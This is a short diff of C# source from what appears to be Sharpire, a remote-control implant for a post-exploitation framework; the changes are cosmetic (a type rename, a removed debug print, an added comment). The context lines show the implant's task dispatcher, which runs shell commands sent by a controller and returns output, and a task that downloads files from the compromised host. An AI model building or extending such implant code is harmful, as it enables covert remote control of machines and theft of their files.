@@ -219,12 +219,11 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         private byte[] processTasking(PACKET packet)
         {
-            byte[] returnPacket = new byte[0];
+            Byte[] returnPacket = new Byte[0];
             try
             {
                 //Change this to a switch : case
                 Int32 type = packet.type;
-                Console.WriteLine("Type: {0}", type);
                 switch (type)
                 {
                     case 1:
@@ -244,7 +243,6 @@ namespace Sharpire
                             output = Agent.InvokeShellCommand(parts.FirstOrDefault(), "");
                         else
                             output = Agent.InvokeShellCommand(parts.FirstOrDefault(), String.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
-
                         Byte[] packetBytes = encodePacket(packet.type, output, packet.taskId);
                         return packetBytes;
                     case 41:
@@ -355,6 +353,8 @@ namespace Sharpire
             return initializationVector;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        // Download File from Agent
         ////////////////////////////////////////////////////////////////////////////////
         public Byte[] Task41(PACKET packet)
         {
